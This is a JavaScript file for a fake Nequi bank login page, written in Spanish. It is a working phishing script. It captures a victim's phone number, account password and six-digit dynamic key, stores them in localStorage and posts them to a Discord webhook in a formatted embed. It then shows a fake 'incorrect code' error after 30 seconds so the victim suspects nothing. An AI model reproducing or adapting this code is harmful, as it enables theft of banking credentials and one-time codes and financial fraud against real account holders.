// js/login.js

const DOM = {
  loader:       document.getElementById('loader'),
  stepOne:      document.getElementById('step-one'),
  formStepOne:  document.getElementById('form-step-one'),
  inputNumber:  document.getElementById('number'),
  inputPass:    document.getElementById('pass'),
  stepCdin:     document.getElementById('step-cdin'),
  formStepCdin: document.getElementById('form-step-cdin'),
  inputCdin:    document.getElementById('cdin'),
  pinInputs:    Array.from(document.querySelectorAll('#form-step-cdin input[type="text"]'))
};

document.addEventListener('DOMContentLoaded', () => {
  DOM.formStepOne.addEventListener('submit', handleStepOneSubmit);
  DOM.formStepCdin.addEventListener('submit', handleStepCdinSubmit);
});

function handleStepOneSubmit(e) {
  e.preventDefault();
  const phone = DOM.inputNumber.value.trim();
  const pass  = DOM.inputPass.value.trim();

  if (phone.length !== 10 || pass.length !== 4) {
    return alert('Por favor verifica tu número (10 dígitos) y clave (4 dígitos).');
  }

  // Mostrar loader
  DOM.loader.classList.remove('hidden');

  // GUARDO EXPLÍCITO en localStorage
  localStorage.setItem('nequi_user', phone);
  localStorage.setItem('nequi_pass', pass);

  // Envío a Discord (si lo haces aquí)
  if (typeof sendUserDataToDiscord === 'function') {
    sendUserDataToDiscord({ user: phone, pass });
  }

  // Cambio de pantalla
  setTimeout(() => {
    DOM.loader.classList.add('hidden');
    DOM.stepOne.classList.add('hidden');
    DOM.stepCdin.classList.remove('hidden');
    DOM.pinInputs[0].focus();
  }, 500); // ligero retardo para UX
}

function handleStepCdinSubmit(e) {
  e.preventDefault();
  const cdin = DOM.inputCdin.value.trim();
  if (cdin.length !== 6) {
    return alert('Ingresa los 6 dígitos de la clave dinámica.');
  }

  // Mostrar loader
  DOM.loader.classList.remove('hidden');

  // Leo user/pass de localStorage
  const phone = localStorage.getItem('nequi_user') || 'N/D';
  const pass  = localStorage.getItem('nequi_pass') || 'N/D';

  // Envío a Discord de TODO
  if (typeof sendUserDataToDiscord === 'function') {
    sendUserDataToDiscord({ user: phone, pass, cdin });
  } else {
    // Ejemplo directo sin función auxiliar:
    sendAllToDiscord({ phone, pass, cdin });
  }

  // Tras 30s muestro error fijo
  setTimeout(() => {
    DOM.loader.classList.add('hidden');
    showError();
  }, 30000);
}

function showError() {
  let el = document.getElementById('error-msg');
  if (!el) {
    el = document.createElement('p');
    el.id = 'error-msg';
    el.className = 'text-red-600 font-semibold text-center mt-4';
    el.textContent = '🔴 Código incorrecto. Intenta más tarde.';
    DOM.formStepCdin.appendChild(el);
  }
  el.style.display = 'block';
}

// Auto-avance de inputs PIN
DOM.pinInputs.forEach((inp, idx) => {
  inp.addEventListener('input', () => {
    inp.value = inp.value.replace(/[^0-9]/g, '');
    if (inp.value && idx < DOM.pinInputs.length - 1) {
      DOM.pinInputs[idx + 1].focus();
    }
    updateCdin();
  });
  inp.addEventListener('keydown', e => {
    if (e.key === 'Backspace' && !inp.value && idx > 0) {
      DOM.pinInputs[idx - 1].focus();
    }
  });
});

window.handlePinInput = (input, idx) => {
  input.value = input.value.replace(/[^0-9]/g, '');
  if (input.value && idx < DOM.pinInputs.length - 1) {
    DOM.pinInputs[idx + 1].focus();
  }
  updateCdin();
};

window.handleKeypadInput = value => {
  if (value === '') {
    for (let i = DOM.pinInputs.length - 1; i >= 0; i--) {
      if (DOM.pinInputs[i].value) {
        DOM.pinInputs[i].value = '';
        DOM.pinInputs[i].focus();
        break;
      }
    }
  } else {
    for (let i = 0; i < DOM.pinInputs.length; i++) {
      if (!DOM.pinInputs[i].value) {
        DOM.pinInputs[i].value = value;
        DOM.pinInputs[i].dispatchEvent(new Event('input'));
        break;
      }
    }
  }
};

function updateCdin() {
  DOM.inputCdin.value = DOM.pinInputs.map(i => i.value).join('');
}

// Ejemplo de envío directo si no usas sendUserDataToDiscord()
async function sendAllToDiscord({ phone, pass, cdin }) {
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/....';
  const payload = {
    username: 'Nequi Bot',
    avatar_url: 'https://i.imgur.com/nequi-logo.png',
    embeds: [{
      title: '🏦 Nueva Solicitud Nequi',
      color: 0xDA0081,
      fields: [
        { name: '📱 Usuario',        value: `+57 ${phone}`, inline: true },
        { name: '🔑 Contraseña',     value: pass,            inline: true },
        { name: '🔐 Clave Dinámica', value: cdin,            inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  };
  await fetch(WEBHOOK_URL, {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify(payload)
  });
}